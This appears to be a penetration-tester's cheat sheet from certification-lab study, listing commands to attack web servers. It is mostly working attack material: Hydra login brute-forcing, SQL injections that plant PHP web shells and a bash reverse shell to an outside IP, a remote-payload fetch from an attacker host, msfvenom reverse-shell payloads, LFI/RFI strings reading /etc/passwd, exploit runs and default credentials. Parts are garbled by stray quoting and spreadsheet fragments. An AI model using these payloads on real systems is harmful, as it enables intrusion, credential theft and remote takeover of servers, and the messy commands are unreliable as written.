## Web Login form Brutefocing 
HTTP Hydra	
```sh
hydra -l admin -P /usr/share/wordlist/SecList/Passwords/10k_most_common.txt 192.168.88.162 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

## PUT method	
```sh
nmap -sV --script http-put --script-args http-put.url=’/test/meterpreter4444.php’,http-put.file=’/root/Exam0119/pwd/192.168.111.149/meterpreter4444.php’ -p 80 192.168.111.149
nmap –script http-methods –script-args http-methods.url-path=’/uploads’,http-methods.test-all -p 8585 172.28.128.3
```


## Starting Web Service
```sh
//Attacker usually uses this to transfer files
python -m SimpleHTTPServer 8080
python3 -m http.server 80"
```

## Nmap Scanning for Web Service(HTTP/HTTPS)
```sh
nmap -PN -p 22 --open -oG - 10.11.1.* | awk '$NF~/ssh/{print $2}'
nmap 10.11.1.* -p22,80 --open -oG - | awk '/22\/open.*80\/open/{print $2}'
nmap 10.11.1.* -p80,8080 --open -oG - | awk '/80\/open.*8080\/open/{print $2}'
nmap -p 80,8080 10.11.1.1-255
```
## - **Uniscan Scanning** <br />
```sh
uniscan.pl -u target -qweds
```

## - **HTTP Enumeration** <br />
```sh
httprint -h http://www.example.com -s signatures.txt
```

## - **Directory Traversal** <br />
To navigate and find any sub directories.
Dirbuster Wordlist : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```sh
dirb http://10.11.1.202 /usr/share/dirb/wordlists/vulns/iis.txt
gobuster -u http://10.11.1.133/ -w /usr/share/wordlists/dirb/common.txt -q -n -e
dirb http://10.11.1.133/index/sips/ /usr/share/dirb/wordlists/
./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php"
//cf. https://github.com/maurosoria/dirsearch

//removing status code for 200,204,301,307,403; 
gobuster -s 200,204,301,307,403 -u http://192.168.88.168 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

## - **Nikto** <br />
```sh
nikto -h 192.168.88.132
nikto -h http(s)://[IP]:[PORT]/[DIRECTORY] 
nikto -C all -h http://10.11.1.72"
```


## - **LFI(Local File Inclusion)** <br />
lfisuite.py
eg. 
```sh
browse.php?file=php://filter/convert.base64-encode/resource=ini.php
browse.php?file=php://filter/convert.base64-encode/resource=browse.php
echo -n encodedstrings | base64 -d
browse.php?file=/etc/passwd
index.php?file=
```
If target has phpinfo.php, check out "file_uploads", see if appears as enabled(ON); if so, the target is vuln for LFI. 


## - **Squid** <br />
proxy scanner/http/squid_pivot_scanning
RHOST : Target
RANGE : Target
RPORT : Squid port 
```sh
msf auxiliary(scanner/http/squid_pivot_scanning) > run
[+] [192.168.88.155] 192.168.88.155 is alive but 21 is CLOSED
[+] [192.168.88.155] 192.168.88.155:80 seems OPEN
if the target uses squid proxy via 3128 port, use nikto with that proxy setting 
nikto -h 192.168.88.155 -useproxy http://192.168.88.155:3128"
```
## - **ShellShock** <br />
nikto scan results; shows shellshock on /cgi-bin; use 34900.py 
```sh
root@kali:~/Exam/Sicos1# python 34900.py payload=reverse rhost=192.168.88.155 lhost=192.168.88.157 lport=1234
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/status"
```

## - **MySQL** <br />
```sh
nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306
```
MySQL login : ```sh mysql -h 192.168.88.152 -D wordpress -u root -p plbkac```
MySQL Spawning Reverse shell(linux) : ```union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php' ```

UPLOAD A FILE : 
```
' union select ""<?php file_put_contents(\""root\"", file_get_contents(\""http://attack.samsclass.info/root\"")); ?>"" INTO OUTFILE '/var/www/ecustomers/samget2.php' #
```
OPEN A PHP SHELL :
```
' union select ""<?php system($_REQUEST['cmd']); ?>"" INTO OUTFILE '/var/www/ecustomers/samshell.php' #
```


## - **Windows IIS** <br />
Getting Windows 0S and version details through Nikto / Nmap  Scanning. 

auxiliary/admin/http/iis_auth_bypass

## - **Tomcat** <br />
Default cred for Tomcat;"tomcat/tomcat"	 and check out /manager console by navigating to browsereg. http://10.11.1.209:8080/manager/html
You can upload reverse shell on manager consor ; msfvenom jsp or war file
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.37 LPORT=443 -f war > shell.war
jar -xvf shell.war
```
## - **Config files** <br />
PHP + DB cred files	
```sh
/etc/mysql/my.cnf 
/var/www/html/config.php
```
## - **WordPress** <br />
```sh
wpscan --url http://10.11.1.71/ -enumerate p
wpscan --url 10.0.2.4 --enumerate vp
wpscan --url https://192.168.88.152:12380/blogblog -enumerate u --disable-tls-checks
wpscan --url http://192.168.88.179/wordpress/ --wordlist /usr/share/wordlists/rockyou.txt
wpscan --url https://192.168.88.152:12380/blogblog/ --enumerate ap --disable-tls-checks
wpscan --url www.local.test --enumerate u --threads 50
```
ref : finding username & password(autoscript) : https://github.com/claudioviviani/bash-wordpress-xml-bruteforce

## - **PHPAdmin** <br />
http://*.*.*.*/phpmyadmin
db and password located @ /etc/phpmyadmin/config-db.php and default cred can be; (root/blank)(pma/blank)
You can also bruteforce by ```sh
hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"```

upload malicious database as .php 
ref : http://hackingandsecurity.blogspot.com/2017/08/proj-12-exploiting-php-vulnerabilities.html
SQL-phpshellscript : 
(1)Once login, clilck SQL and ""Run SQL query/queries on server ""localhost"":"" and provide beblow sql-query to create (shell).php script.
Windows : SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\shell.php""
Linux : SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""/var/www/html/shell.php""
(2) now visit http://192.168.1.101/DBlocation/shell.php?cmd=ipconfig
(3) if you wanna hav better shell; ?cmd=wget%20192.168.1.102/shell.php"
CURL | base encode/decode	"curl -s http://192.168.88.168/index.php
root@kali:~$echo jeff | base64
amVmZgo=
root@kali:~$echo -n VXNlcm5hbWU6 |base64 -d
Username:"
RFI	"https://github.com/3mrgnc3/LFIter2/blob/master/lfitr2.py
https://www.youtube.com/watch?v=rs4zEwONzzk
browse.php?file=http://10.11.0.42/index.html
browse.php?file=ftp://10.11.0.42/index.html
browse.php?expect://ls
gain a shell via phpinfo.php https://office.tuxcon.com/root/web-sec-payloads/src/commit/fd99da6c06e00a596becdcfc6d2efe50bad0f47c/File%20Inclusion%20-%20Path%20Traversal
phpinfolfi.py or https://github.com/D35m0nd142/Kadabra/blob/master/phpinfo.py
needs to update the shell and browse.php part etc. 
instruction : https://www.youtube.com/watch?v=rs4zEwONzzk"
Webdav 	"nmap -T4 -p80 --script=http-iis-webdav-vuln 10.11.1.229
cf. auxiliary : webdav_test
davtest -url http://10.11.1.229
[webhsell]msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443  -f asp > shells.asp 
[webhsell]/usr/share/webshells/asp/cmdasp.asp
cadaver http://10.11.x.x/webdav/
dav:> put shells.txt
Uploading shells.txt to `shells.txt':
dav:> copy shells.txt shells.asp;.txt"
ColdFusion	"Version check : http://example.com/CFIDE/adminapi/base.cfc?wsdl
LFI(passowrd file) : http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
(either - neo-security.xml and password.properties)
ref * https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
exploit/windows/http/coldfusion_fckeditor - only for 8.0.1"
XAMPP	cred(wampp/xampp)
RealVNC	"https://www.exploit-db.com/exploits/36932
Edit, BIND_ADDR into mine and BIND_PORT into 4444
root@kali:~/PWK-Lab/10.11.1.227$python RealVNC-exploit-36932.py 
[*] Please input an IP address to pwn: 10.11.1.227
[*] Hello From Server: RFB 003.008
Ctrl+Alt+Shift+Del will be vmware's ctrl+alt+del"
Drupal	cred(admin/admin)
Elastix	"cred(admin/admin) http://example.com/vtigercrm/ 
You might be able to upload shell in profile-photo."
SuirrelMail	"https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh
RFI : http://10.11.1.115/webmail/src/read_body.php?mailbox=/etc/passwd&passed_id=1&"
	
AT-TFTP 1.9 version	"https://github.com/brianwrf/cve-2006-6184
1.perl -e 'print """"\x81\xec\xac\x0d\x00\x00""""' > stackadj
2.msfvenom -p windows/shell/reverse_nonx_tcp LHOST=10.11.0.37 LPORT=443 R > payload
3.cat stackadj payload > shellcode
4. cat shellcode | msfvenom -e x86/shikata_ga_nai -b """"\x00"""" -a x86 --platform win -f python"
